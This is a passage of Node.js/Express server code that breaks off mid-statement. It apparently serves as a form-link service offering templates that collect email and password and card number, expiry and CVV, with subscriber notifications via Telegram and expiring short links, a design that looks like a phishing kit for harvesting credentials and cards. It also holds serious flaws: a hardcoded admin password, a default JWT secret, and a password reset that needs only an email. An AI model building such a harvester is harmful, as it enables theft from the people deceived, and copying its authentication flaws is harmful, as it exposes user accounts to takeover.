const express = require('express');
const bodyParser = require('body-parser');
const ejs = require('ejs');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const mongoose = require('mongoose');
const path = require('path');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';
const ADMIN_PASSWORD_HASH = bcrypt.hashSync('midas', 10);
const PAYSTACK_SECRET_KEY = process.env.PAYSTACK_SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

app.set('trust proxy', 3);

if (!TELEGRAM_BOT_TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN is not defined in environment variables');
  process.exit(1);
}

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 15, // limit each IP to 15 requests per windowMs
  standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

// Specific rate limiter for forgot password and reset password routes
const forgotPasswordLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Limit each IP to 5 requests per windowMs
  message: {
    error: 'Too many forgot password attempts from this IP. Please try again after 15 minutes.',
  },
  standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
  legacyHeaders: false, // Disable the `X-RateLimit-*` headers
});

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/plexzora';
console.log('Attempting to connect to MongoDB with URI:', MONGODB_URI.replace(/:([^:@]+)@/, ':****@'));

mongoose.connect(MONGODB_URI, {
  serverSelectionTimeoutMS: 30000,
  socketTimeoutMS: 45000,
  connectTimeoutMS: 30000,
  retryWrites: true,
}).then(() => {
  console.log('Successfully connected to MongoDB');
}).catch(err => {
  console.error('MongoDB connection error:', err.message, err.stack);
  process.exit(1);
});

// Mongoose Schemas
const submissionSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  formId: { type: String, required: true, index: true },
  timestamp: { type: Date, default: Date.now, index: true },
  data: { type: Object, required: true },
}, { timestamps: true });

submissionSchema.index({ userId: 1, formId: 1 });

const formConfigSchema = new mongoose.Schema({
  formId: { type: String, required: true, unique: true, index: true },
  userId: { type: String, required: true, index: true },
  template: { type: String, required: true },
  headerText: String,
  headerColors: [String],
  subheaderText: String,
  subheaderColor: String,
  placeholders: [{ id: String, placeholder: String }],
  borderShadow: String,
  buttonColor: String,
  buttonTextColor: String,
  buttonText: String,
  buttonAction: String,
  buttonUrl: String,
  buttonMessage: String,
  theme: String,
  createdAt: { type: Date, default: Date.now, index: true },
  expiresAt: { type: Date, index: true },
}, { timestamps: true });

const formCreationSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  formId: { type: String, required: true, index: true },
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

const userSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  username: String,
  email: { type: String, required: true, unique: true, index: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
}, { timestamps: true });

const adminSettingsSchema = new mongoose.Schema({
  linkLifespan: Number,
  linkLifespanValue: Number,
  linkLifespanUnit: String,
  maxFormsPerUserPerDay: Number,
  maxFormsPer6HoursForSubscribers: Number,
  restrictionsEnabled: { type: Boolean, default: true },
}, { timestamps: true });

const subscriptionSchema = new mongoose.Schema({
  userId: { type: String, required: true, index: true },
  email: String,
  planId: String,
  billingPeriod: String,
  reference: { type: String, unique: true, index: true },
  status: String,
  startDate: Date,
  endDate: Date,
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

subscriptionSchema.index({ userId: 1, status: 1, endDate: -1 });

const telegramSchema = new mongoose.Schema({
  userId: { type: String, required: true, unique: true, index: true },
  chatId: { type: String, required: true },
  createdAt: { type: Date, default: Date.now, index: true },
}, { timestamps: true });

// Create models
const Submission = mongoose.model('Submission', submissionSchema);
const FormConfig = mongoose.model('FormConfig', formConfigSchema);
const FormCreation = mongoose.model('FormCreation', formCreationSchema);
const User = mongoose.model('User', userSchema);
const AdminSettings = mongoose.model('AdminSettings', adminSettingsSchema);
const Subscription = mongoose.model('Subscription', subscriptionSchema);
const Telegram = mongoose.model('Telegram', telegramSchema);

// Initialize default admin settings
async function initializeAdminSettings() {
  try {
    const settings = await AdminSettings.findOne();
    if (!settings) {
      await AdminSettings.create({
        linkLifespan: 604800000,
        linkLifespanValue: 7,
        linkLifespanUnit: 'days',
        maxFormsPerUserPerDay: 10,
        maxFormsPer6HoursForSubscribers: 50,
        restrictionsEnabled: true,
      });
      console.log('Created default admin settings');
    }
  } catch (err) {
    console.error('Error initializing admin settings:', err.message, err.stack);
    throw err;
  }
}

// MongoDB connection handling
mongoose.connection.once('open', async () => {
  console.log('MongoDB connection is open');
  try {
    await initializeAdminSettings();
  } catch (err) {
    console.error('Initialization failed:', err.message, err.stack);
    process.exit(1);
  }
});

mongoose.connection.on('error', (err) => {
  console.error('MongoDB connection error:', err.message, err.stack);
  process.exit(1);
});

// Initialize Telegram bot
const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

bot.start(async (ctx) => {
  const userId = ctx.startPayload;
  const chatId = ctx.chat.id.toString();

  if (!userId) {
    return ctx.reply('Error: No user ID provided. Please use the link from your dashboard.');
  }

  try {
    const subscription = await Subscription.findOne({
      userId,
      status: 'active',
      endDate: { $gt: new Date() },
    });
    if (!subscription) {
      return ctx.reply('Error: You need an active subscription to connect Telegram for notifications.');
    }

    await Telegram.updateOne(
      { userId },
      { userId, chatId, createdAt: new Date() },
      { upsert: true }
    );
    console.log(`Linked Telegram chatId ${chatId} to userId ${userId}`);
    ctx.reply('Your Telegram account is now connected! You will receive form submission notifications here.');
  } catch (error) {
    console.error('Error saving Telegram chatId:', error.message);
    ctx.reply('Error connecting your Telegram account. Please try again later.');
  }
});

bot.launch().then(() => {
  console.log('Telegram bot started');
}).catch((error) => {
  console.error('Telegram bot failed to start:', error.message);
  process.exit(1);
});

process.on('SIGINT', () => {
  bot.stop('SIGINT');
  console.log('Telegram bot stopped');
  process.exit(0);
});

process.on('SIGTERM', () => {
  bot.stop('SIGTERM');
  console.log('Telegram bot stopped');
  process.exit(0);
});

// Middleware
app.use(cors({
  origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://smavo.onrender.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
  credentials: false,
}));
app.use(bodyParser.json());
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
  res.sendStatus(200);
});

// Utility functions
function normalizeUrl(url) {
  if (!url) return null;
  url = url.trim();
  if (url.match(/^https?:\/\//)) return url;
  if (url.match(/\.[a-z]{2,}$/i)) return `https://${url}`;
  return null;
}

async function generateShortCode(length = 6) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let code = '';
  for (let i = 0; i < length; i++) {
    code += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  const existing = await FormConfig.findOne({ formId: code });
  if (existing) {
    return generateShortCode(length);
  }
  return code;
}

function sanitizeForJs(str) {
  if (!str) return '';
  return str
    .replace(/['"`]/g, '\\$&')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&/g, '&amp;');
}

async function isFormExpired(formId) {
  const config = await FormConfig.findOne({ formId });
  if (!config || !config.createdAt) {
    console.log(`Form ${formId} not found or missing createdAt`);
    return true;
  }

  const adminSettings = await AdminSettings.findOne();
  const isSubscribed = await hasActiveSubscription(config.userId);
  if (isSubscribed || !adminSettings.restrictionsEnabled) {
    console.log(`Expiration check skipped for form ${formId}: user is subscribed=${!!isSubscribed}, restrictionsEnabled=${adminSettings.restrictionsEnabled}`);
    return false;
  }

  if (!adminSettings.linkLifespan) {
    console.log(`No linkLifespan set for form ${formId}, assuming not expired`);
    return false;
  }

  const createdTime = new Date(config.createdAt).getTime();
  const currentTime = Date.now();
  const isExpired = (currentTime - createdTime) > adminSettings.linkLifespan;

  if (isExpired) {
    console.log(`Form ${formId} is expired, deleting form and submissions`);
    await FormConfig.deleteOne({ formId });
    await Submission.deleteMany({ formId });
    console.log(`Deleted form ${formId} and its submissions`);
  }

  console.log(`Form ${formId} expiration check: createdAt=${config.createdAt}, currentTime=${currentTime}, linkLifespan=${adminSettings.linkLifespan}, isExpired=${isExpired}`);
  return isExpired;
}

async function countUserFormsToday(userId) {
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  const todayStart = today.getTime();
  const todayEnd = todayStart + 24 * 60 * 60 * 1000;

  const count = await FormCreation.countDocuments({
    userId,
    createdAt: { $gte: new Date(todayStart), $lt: new Date(todayEnd) },
  });

  console.log(`Counted ${count} forms created today for user ${userId}`);
  return count;
}

async function countUserFormsLast6Hours(userId) {
  const sixHoursAgo = new Date(Date.now() - 6 * 60 * 60 * 1000); // 6 hours ago in ms
  const count = await FormCreation.countDocuments({
    userId,
    createdAt: { $gte: sixHoursAgo },
  });
  console.log(`Counted ${count} forms created in last 6 hours for user ${userId}`);
  return count;
}

async function getUserCount() {
  return await User.countDocuments();
}

async function getSubscriberCount() {
  const activeSubscribers = await Subscription.countDocuments({
    status: 'active',
    endDate: { $gt: new Date() },
  });
  console.log(`Counted ${activeSubscribers} active subscribers`);
  return activeSubscribers;
}

async function hasActiveSubscription(userId) {
  try {
    const activeSubscription = await Subscription.findOne({
      userId,
      status: 'active',
      endDate: { $gt: new Date() },
    }).sort({ createdAt: -1 });
    const hasActive = !!activeSubscription;
    console.log(`User ${userId} has active subscription: ${hasActive}`, activeSubscription || {});
    return activeSubscription;
  } catch (error) {
    console.error('Error checking subscription status:', error.message);
    return null;
  }
}

function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    console.error('No token provided in Authorization header');
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    console.log('Token decoded:', decoded);
    req.user = decoded;
    next();
  } catch (error) {
    console.error('Token verification error:', error.message);
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

function verifyAdminPassword(req, res, next) {
  const { adminPassword } = req.body;
  if (!adminPassword || !bcrypt.compareSync(adminPassword, ADMIN_PASSWORD_HASH)) {
    return res.status(401).json({ error: 'Invalid admin password' });
  }
  next();
}

// Paystack webhook verification middleware
function verifyPaystackWebhook(req, res, next) {
  const hash = crypto
    .createHmac('sha512', PAYSTACK_SECRET_KEY)
    .update(JSON.stringify(req.body))
    .digest('hex');
  const signature = req.headers['x-paystack-signature'];

  if (!signature || hash !== signature) {
    console.error('Paystack webhook verification failed');
    return res.status(401).json({ error: 'Invalid webhook signature' });
  }

  console.log('Paystack webhook signature verified successfully');
  next();
}

// Routes
app.get('/user', authenticateToken, async (req, res) => {
  try {
    const user = await User.findOne({ id: req.user.userId });
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    const { id, username, email, createdAt } = user;
    res.json({
      user: { id, username, email, createdAt },
      message: 'User info retrieved successfully',
    });
  } catch (error) {
    console.error('Error fetching user info:', error);
    res.status(500).json({ error: 'Failed to fetch user info' });
  }
});

app.post('/signup', limiter, async (req, res) => {
  try {
    const { username, email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ error: 'User already exists with this email' });
    }

    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    const newUser = new User({
      id: Date.now().toString(),
      username: username || '',
      email,
      password: hashedPassword,
      createdAt: new Date().toISOString(),
    });

    await newUser.save();

    const token = jwt.sign({ userId: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '1h' });
    res.status(201).json({ message: 'User created successfully', token });
  } catch (error) {
    console.error('Signup error:', error);
    res.status(500).json({ error: 'Signup failed' });
  }
});

app.post('/login', limiter, async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '100h' });
    res.json({ message: 'Login successful', token });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

app.post('/forgot-password', forgotPasswordLimiter, async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) {
      return res.status(400).json({ error: 'Email is required' });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ error: 'Email not found' });
    }

    res.json({ message: 'Email found, proceed to reset' });
  } catch (error) {
    console.error('Forgot password error:', error);
    res.status(500).json({ error: 'Forgot password check failed' });
  }
});

app.post('/reset-password', forgotPasswordLimiter, async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and new password are required' });
    }

    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ error: 'Email not found' });
    }

    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);
    user.password = hashedPassword;
    user.updatedAt = new Date().toISOString();

    await user.save();

    res.json({ message: 'Password reset successfully' });
  } catch (error) {
    console.error('Reset password error:', error);
    res.status(500).json({ error: 'Reset password failed' });
  }
});

app.get('/admin', async (req, res) => {
  try {
    const adminSettings = await AdminSettings.findOne();
    const userCount = await getUserCount();
    const subscriberCount = await getSubscriberCount();
    res.render('admin', {
      headerHtml: 'Admin Settings',
      subheaderText: 'Configure form settings',
      subheaderColor: '#555555',
      borderShadow: '0 0 0 2px #000000',
      buttonColor: 'linear-gradient(45deg, #00b7ff, #0078ff)',
      buttonTextColor: '#ffffff',
      buttonText: 'Update Settings',
      theme: 'light',
      userCount,
      subscriberCount,
      restrictionsEnabled: adminSettings.restrictionsEnabled,
      linkLifespanValue: adminSettings.linkLifespanValue,
      linkLifespanUnit: adminSettings.linkLifespanUnit,
      maxFormsPerUserPerDay: adminSettings.maxFormsPerUserPerDay,
      maxFormsPer6HoursForSubscribers: adminSettings.maxFormsPer6HoursForSubscribers,
    });
  } catch (error) {
    console.error('Error rendering admin page:', error.message, error.stack);
    res.status(500).send('Error rendering admin page');
  }
});

app.post('/admin/settings', verifyAdminPassword, async (req, res) => {
  try {
    const { linkLifespanValue, linkLifespanUnit, maxFormsPerUserPerDay, maxFormsPer6HoursForSubscribers, restrictionsEnabled } = req.body;

    if (restrictionsEnabled) {
      if (!linkLifespanValue || !linkLifespanUnit || !maxFormsPerUserPerDay || !maxFormsPer6HoursForSubscribers) {
        return res.status(400).json({ error: 'Link lifespan value, unit, max forms per user per day, and max forms per 6 hours for subscribers are required when restrictions are enabled' });
      }

      if (!Number.isInteger(Number(linkLifespanValue)) || Number(linkLifespanValue) <= 0) {
        return res.status(400).json({ error: 'Link lifespan value must be a positive integer' });
      }

      if (!['seconds', 'minutes', 'hours', 'days'].includes(linkLifespanUnit)) {
        return res.status(400).json({ error: 'Link lifespan unit must be one of: seconds, minutes, hours, days' });
      }

      if (!Number.isInteger(Number(maxFormsPerUserPerDay)) || Number(maxFormsPerUserPerDay) <= 0) {
        return res.status(400).json({ error: 'Max forms per user per day must be a positive integer' });
      }

      if (!Number.isInteger(Number(maxFormsPer6HoursForSubscribers)) || Number(maxFormsPer6HoursForSubscribers) <= 0) {
        return res.status(400).json({ error: 'Max forms per 6 hours for subscribers must be a positive integer' });
      }
    }

    let lifespanMs = null;
    if (restrictionsEnabled) {
      const value = Number(linkLifespanValue);
      switch (linkLifespanUnit) {
        case 'seconds':
          lifespanMs = value * 1000;
          break;
        case 'minutes':
          lifespanMs = value * 60 * 1000;
          break;
        case 'hours':
          lifespanMs = value * 60 * 60 * 1000;
          break;
        case 'days':
          lifespanMs = value * 24 * 60 * 60 * 1000;
          break;
        default:
          return res.status(400).json({ error: 'Invalid link lifespan unit' });
      }
    }

    const adminSettings = {
      linkLifespan: lifespanMs,
      linkLifespanValue: restrictionsEnabled ? Number(linkLifespanValue) : null,
      linkLifespanUnit: restrictionsEnabled ? linkLifespanUnit : null,
      maxFormsPerUserPerDay: restrictionsEnabled ? Number(maxFormsPerUserPerDay) : null,
      maxFormsPer6HoursForSubscribers: restrictionsEnabled ? Number(maxFormsPer6HoursForSubscribers) : null,
      restrictionsEnabled: !!restrictionsEnabled,
    };

    await AdminSettings.updateOne({}, adminSettings, { upsert: true });
    console.log('Admin settings updated:', adminSettings);

    if (adminSettings.restrictionsEnabled) {
      const expiredForms = await FormConfig.find({
        expiresAt: { $lte: new Date() },
      });
      const expiredFormIds = expiredForms.map(f => f.formId);

      if (expiredFormIds.length > 0) {
        await FormConfig.deleteMany({ formId: { $in: expiredFormIds } });
        await Submission.deleteMany({ formId: { $in: expiredFormIds } });
        console.log(`Deleted ${expiredFormIds.length} expired forms during admin settings update`);
      }
    }

    res.status(200).json({
      message: 'Admin settings updated successfully',
      settings: adminSettings,
    });
  } catch (error) {
    console.error('Error updating admin settings:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to update admin settings', details: error.message });
  }
});

app.get('/api/telegram/connect', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    const subscription = await Subscription.findOne({
      userId,
      status: 'active',
      endDate: { $gt: new Date() },
    });

    if (!subscription) {
      return res.status(403).json({ error: 'You need an active subscription to connect Telegram for notifications.' });
    }

    const telegramLink = `https://t.me/${bot.botInfo.username}?start=${userId}`;
    console.log(`Generated Telegram link for user ${userId}: ${telegramLink}`);
    res.json({
      message: 'Telegram connect link generated successfully',
      telegramLink,
    });
  } catch (error) {
    console.error('Error generating Telegram link:', error.message);
    res.status(500).json({ error: 'Failed to generate Telegram link', details: error.message });
  }
});

app.get('/get', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    console.log(`Processing /get request for user ${userId}`);

    const submissions = await Submission.find({ userId }).sort({ timestamp: -1 });
    console.log(`Retrieved ${submissions.length} submissions for user ${userId}`);

    const adminSettings = await AdminSettings.findOne();
    console.log(`Loaded admin settings:`, adminSettings);

    const activeSubscription = await hasActiveSubscription(userId);
    const isSubscribed = !!activeSubscription;
    let subscriptionDetails = null;
    if (isSubscribed) {
      subscriptionDetails = {
        billingPeriod: activeSubscription.billingPeriod,
        endDate: activeSubscription.endDate,
      };
    }

    const userFormConfigs = {};
    const validForms = [];
    const formConfigs = await FormConfig.find({ userId });
    for (const config of formConfigs) {
      const isExpired = await isFormExpired(config.formId);
      if (!isExpired) {
        const computedExpiresAt = (adminSettings.restrictionsEnabled && !isSubscribed)
          ? new Date(new Date(config.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
          : null;
        userFormConfigs[config.formId] = { ...config.toObject(), expiresAt: computedExpiresAt };
        validForms.push(config.formId);
      }
    }
    console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')})`);

    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
        ],
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        ],
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
        ],
      },
    };

    const responseData = {
      submissions,
      formConfigs: userFormConfigs,
      templates,
      userId,
      isSubscribed,
      subscriptionDetails,
    };
    console.log(`Returning data for user ${userId}:`, {
      submissionCount: responseData.submissions.length,
      formConfigCount: Object.keys(responseData.formConfigs).length,
      templateKeys: Object.keys(responseData.templates),
      userId: responseData.userId,
      isSubscribed: responseData.isSubscribed,
      subscriptionDetails: responseData.subscriptionDetails,
    });

    res.json(responseData);
  } catch (error) {
    console.error('Error fetching data for /get:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
  }
});

app.post('/create', authenticateToken, async (req, res) => {
  try {
    console.log('Received /create request:', req.body);
    const userId = req.user.userId;
    const adminSettings = await AdminSettings.findOne();

    const isSubscribed = await hasActiveSubscription(userId);

    // Existing free-user limit check (unchanged)
    if (!isSubscribed && adminSettings.restrictionsEnabled) {
      const userFormCountToday = await countUserFormsToday(userId);
      if (userFormCountToday >= adminSettings.maxFormsPerUserPerDay) {
        return res.status(403).json({ error: `Maximum form limit (${adminSettings.maxFormsPerUserPerDay} per day) reached` });
      }
    }

    // Updated paid-user limit check (dynamic forms per 6 hours, rolling window)
    if (isSubscribed && adminSettings.restrictionsEnabled) {
      const userFormCountLast6Hours = await countUserFormsLast6Hours(userId);
      const maxFormsPer6Hours = adminSettings.maxFormsPer6HoursForSubscribers || 50;
      if (userFormCountLast6Hours >= maxFormsPer6Hours) {
        return res.status(403).json({ error: `form creation failed` });
      }
    }

    const templateId = req.body.template || 'sign-in';
    const formId = await generateShortCode();
    const validActions = ['url', 'message'];
    const config = {
      formId,
      userId,
      template: templateId,
      headerText: req.body.headerText || 'My Form',
      headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
      subheaderText: req.body.subheaderText || 'Fill the form',
      subheaderColor: req.body.subheaderColor || (req.body.theme === 'dark' ? '#d1d5db' : '#555555'),
      placeholders: Array.isArray(req.body.placeholders) ? req.body.placeholders.map(p => ({
        id: sanitizeForJs(p.id),
        placeholder: sanitizeForJs(p.placeholder),
      })) : [],
      borderShadow: req.body.borderShadow || (req.body.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
      buttonColor: req.body.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
      buttonTextColor: req.body.buttonTextColor || (req.body.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
      buttonText: req.body.buttonText || 'Sign In',
      buttonAction: validActions.includes(req.body.buttonAction) ? req.body.buttonAction : 'url',
      buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
      buttonMessage: req.body.buttonMessage || '',
      theme: req.body.theme === 'dark' ? 'dark' : 'light',
      createdAt: new Date().toISOString(),
      expiresAt: !isSubscribed && adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespan).toISOString() : null,
    };

    if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
      console.error('Invalid URL provided:', config.buttonUrl);
      return res.status(400).json({ error: 'Invalid URL provided' });
    }
    if (config.buttonAction === 'message' && !config.buttonMessage) {
      config.buttonMessage = 'Form submitted successfully!';
    }

    await new FormCreation({ userId, formId, createdAt: config.createdAt }).save();
    await new FormConfig(config).save();
    console.log(`Stored form config for ${formId} for user ${userId}:`, config);

    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = req.headers.host || `localhost:${port}`;
    const url = `${protocol}://${host}/form/${formId}`;
    console.log('Generated URL:', url);
    res.status(200).json({ url, formId, expiresAt: config.expiresAt });
  } catch (error) {
    console.error('Error in /create:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to generate shareable link', details: error.message });
  }
});

app.put('/api/form/:id', authenticateToken, async (req, res) => {
  try {
    console.log('Received /api/form/:id PUT request:', req.body);
    const formId = req.params.id;
    const userId = req.user.userId;
    const updatedConfig = req.body;

    const existingConfig = await FormConfig.findOne({ formId, userId });
    if (!existingConfig) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(404).json({ error: 'Form not found or access denied' });
    }

    const adminSettings = await AdminSettings.findOne();
    if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
      return res.status(403).json({ error: 'Form has expired' });
    }

    const isSubscribed = await hasActiveSubscription(userId);

    const validActions = ['url', 'message'];
    const config = {
      formId,
      userId,
      template: updatedConfig.template || existingConfig.template,
      headerText: updatedConfig.headerText || existingConfig.headerText || 'My Form',
      headerColors: Array.isArray(updatedConfig.headerColors) ? updatedConfig.headerColors.map(sanitizeForJs) : existingConfig.headerColors,
      subheaderText: updatedConfig.subheaderText || existingConfig.subheaderText || 'Fill the form',
      subheaderColor: updatedConfig.subheaderColor || existingConfig.subheaderColor || (updatedConfig.theme === 'dark' ? '#d1d5db' : '#555555'),
      placeholders: Array.isArray(updatedConfig.placeholders) ? updatedConfig.placeholders.map(p => ({
        id: sanitizeForJs(p.id),
        placeholder: sanitizeForJs(p.placeholder),
      })) : existingConfig.placeholders,
      borderShadow: updatedConfig.borderShadow || existingConfig.borderShadow || (updatedConfig.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
      buttonColor: updatedConfig.buttonColor || existingConfig.buttonColor || 'linear-gradient(45deg, #00b7ff, #0078ff)',
      buttonTextColor: updatedConfig.buttonTextColor || existingConfig.buttonTextColor || (updatedConfig.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
      buttonText: updatedConfig.buttonText || existingConfig.buttonText || 'Sign In',
      buttonAction: validActions.includes(updatedConfig.buttonAction) ? updatedConfig.buttonAction : existingConfig.buttonAction || 'url',
      buttonUrl: updatedConfig.buttonUrl ? normalizeUrl(updatedConfig.buttonUrl) : existingConfig.buttonUrl || '',
      buttonMessage: updatedConfig.buttonMessage || existingConfig.buttonMessage || '',
      theme: updatedConfig.theme === 'dark' ? 'dark' : updatedConfig.theme === 'light' ? 'light' : existingConfig.theme || 'light',
      createdAt: existingConfig.createdAt,
      updatedAt: new Date().toISOString(),
      expiresAt: (adminSettings.restrictionsEnabled && !isSubscribed)
        ? new Date(new Date(existingConfig.createdAt).getTime() + adminSettings.linkLifespan).toISOString()
        : null,
    };

    if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
      console.error('Invalid URL provided:', config.buttonUrl);
      return res.status(400).json({ error: 'Invalid URL provided' });
    }
    if (config.buttonAction === 'message' && !config.buttonMessage) {
      config.buttonMessage = 'Form submitted successfully!';
    }

    await FormConfig.updateOne({ formId }, config);
    console.log(`Updated form config for ${formId} for user ${userId}:`, config);

    const protocol = process.env.NODE_ENV === 'production' ? 'https' : 'http';
    const host = req.headers.host || `localhost:${port}`;
    const url = `${protocol}://${host}/form/${formId}`;
    console.log('Generated URL for updated form:', url);
    res.status(200).json({ url, formId, message: 'Form updated successfully' });
  } catch (error) {
    console.error('Error in /api/form/:id PUT:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to update form', details: error.message });
  }
});

app.post('/form/:id/submit', limiter, async (req, res) => {
  const formId = req.params.id;

  const config = await FormConfig.findOne({ formId });
  if (!config) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).json({ error: 'Form not found' });
  }
  const adminSettings = await AdminSettings.findOne();
  if (adminSettings.restrictionsEnabled && await isFormExpired(formId)) {
    return res.status(403).json({ error: 'Form has expired' });
  }

  try {
    const formData = req.body;
    const userId = config.userId;
    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } },
        ],
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        ],
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } },
        ],
      },
    };
    const template = templates[config.template] || templates['sign-in'];

    const mappedData = {};
    Object.entries(formData).forEach(([fieldId, value]) => {
      const customField = config.placeholders.find(p => p.id === fieldId);
      const templateField = template.fields.find(f => f.id === fieldId);
      const displayName = customField?.placeholder || templateField?.placeholder || fieldId;
      mappedData[sanitizeForJs(displayName)] = sanitizeForJs(value);
    });

    const submission = new Submission({
      userId,
      formId,
